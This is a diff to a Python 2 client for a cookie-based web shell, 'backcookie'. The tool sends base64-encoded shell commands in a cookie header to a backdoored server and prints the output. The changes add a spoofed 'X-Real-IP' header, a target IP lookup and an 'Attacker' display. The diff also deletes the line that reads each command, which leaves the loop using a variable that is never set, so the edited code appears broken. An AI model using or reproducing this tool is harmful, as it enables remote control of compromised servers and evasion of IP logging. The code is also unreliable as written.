@@ -11,6 +11,7 @@ import os                                     #
 import sys                                    #
 import urllib                                 #
 import optparse                               #
+import socket                                 #
 try:                                          # 
     import requests                           #
 except:                                       ################################
@@ -51,9 +52,22 @@ class core:
     eb = 'base64'
     cl = {"blue": "\033[94m", "red": "\033[91m", "green": "\033[92m", "white": "\033[0m", "yellow": "\033[93m"}
 
-# Simplification
+# Simplification print, close & get ip!
 def go(value):
 	print value
+
+def run(value):
+	raw_input(value)
+
+def close(value):
+	sys.exit(value)
+
+def goip(value):
+        try:
+            Iphost = socket.gethostbyname(value)
+        except socket.gaierror:
+            Iphost = "None"
+        return Iphost
 
 def Error():
 	go(core.cl['white'] + "\t\t-------------" + core.cl['red'] + core.bc + core.cl['white'] + "------------")
@@ -61,26 +75,27 @@ def Error():
 	go("\t\t+             sorry :(            +")
 	go("\t\t-----------------------------------\n\n")
 	go(core.cl['blue'] + "[-] " + core.cl['red']  + "Error:" +  core.cl['yellow'] + " " + "Connection! \n" + core.cl['white'])
-	exit(0)
+	close(0)
 
 def backcookie(command, host, cookie, vcmd):
 	headers = {
 	           core.ua: 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0', 
+	           'X-Real-IP': '1.1.1.1',
 	           core.ck: cookie + '=' + command.encode(core.eb)
 	          }
 	try:
-		r = requests.get(host, headers=headers)
-		v = r.headers.values()
+		req = requests.get(host, headers=headers)
+		val = req.headers.values()
 	except:
 		Error()
-	if v[0] == "0" or vcmd == "command": # vcmd > validate command
-		go(core.cl['blue'] + r.text.strip() + core.cl['white'])
-	#else:
-		#Error()
+	if val[0] == "0" or vcmd == "command": # vcmd > validate command
+		go(core.cl['blue'] + req.text.strip() + core.cl['white'])
+	else:
+		pass
 
 def shell(host, cookie):
 	backcookie("", host, cookie, "")
-
+	# Home of backcookie 
 	go(core.cl['white'] + "\t\t-------------" + core.cl['red'] + core.bc + core.cl['white'] + "------------")
 	go("\t\t+      Developed by: @jofpin      +")
 	go("\t\t+             To play             +")
@@ -98,7 +113,13 @@ def shell(host, cookie):
 	domain = host.split("/")[2]
 
 	# Your nick in console
-	nick = raw_input(core.cl['blue'] + "[!] " + core.cl['white']  + "Your nick: " + core.cl['white'])
+	nick = raw_input(core.cl['blue'] + "[" + core.cl['yellow'] + "!" + core.cl['blue'] + "]" + " " + core.cl['white']  + "Your nick: " + core.cl['white'])
+	if nick:
+		pass
+	else:
+		go("\n")
+		go(core.cl['red'] + "[-] " + core.cl['white']  + "Do not insert a nick :(" + core.cl['white'])
+		close(core.cl['blue'] + "[-] " + core.cl['green'] + "Status: " + core.cl['red'] + "close!\n" + core.cl['white'])
 
 	while True:
 
@@ -108,13 +129,15 @@ def shell(host, cookie):
 		else:
 			go("\n")
 			go(core.cl['yellow'] + "[*] " + core.cl['white']  + "Information" + core.cl['white'])
+			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Attacker: " + core.cl['yellow'] + nick + core.cl['white'])
 			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Host: " + core.cl['blue'] + domain + core.cl['white'])
+			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Ip: " + core.cl['blue'] + goip(domain) + core.cl['white'])
 			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "WebServer: " + core.cl['blue'] + server + core.cl['white'])
 			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Target: " + core.cl['blue'] + host + core.cl['white'])
 			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Cookie: " + core.cl['blue'] + cookie + core.cl['white'])
+			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Command: " + core.cl['blue'] + command.encode(core.eb) + core.cl['white'])
 			go("\n")
-
-		command = raw_input(nick + "@" + domain + ":~$ ")
+			
 		if command != "exit": # exit console backcookie
 			backcookie(command, host, cookie, "command")
 		else:
@@ -123,7 +146,7 @@ def shell(host, cookie):
 			go("\t\t+       Security researcher      +")
 			go("\t\t+            @jofpin             +")
 			go("\t\t----------------------------------\n\n")
-			go(core.cl['green'] + "[!] " + core.cl['blue'] + "Version:" + " " + core.cl['yellow'] + _version_ + core.cl['white'])
+			go(core.cl['green'] + "[!] " + core.cl['white'] + "Version:" + " " + core.cl['yellow'] + _version_ + core.cl['white'])
 			go(core.cl['blue'] + "[-] " + core.cl['red'] + core.bc + " OFF\n" + core.cl['white'])
 			break
 
@@ -138,13 +161,13 @@ def main():
 		shell(host, cookie)
 	else:
 		parser.print_help()
-		exit(0)
+		close(0)
 
 if __name__ == "__main__":
         try:
         	main()
         except KeyboardInterrupt:
-        	sys.exit(core.cl['blue'] + "\n\n[-] " + core.cl['green'] + "Status: " + core.cl['red'] + "close!\n" + core.cl['white']) #Ctrl + c = close
+        	close(core.cl['blue'] + "\n\n[-] " + core.cl['green'] + "Status: " + core.cl['red'] + "close!\n" + core.cl['white']) # Ctrl + c = close
                 pass
         except Exception as ke:
-        	sys.exit(core.cl['red'] + "Error: " + core.cl['blue'] + "%s" % ke + core.cl['white']) # Result of error
+        	close(core.cl['red'] + "Error: " + core.cl['blue'] + "%s" % ke + core.cl['white']) # Result of error
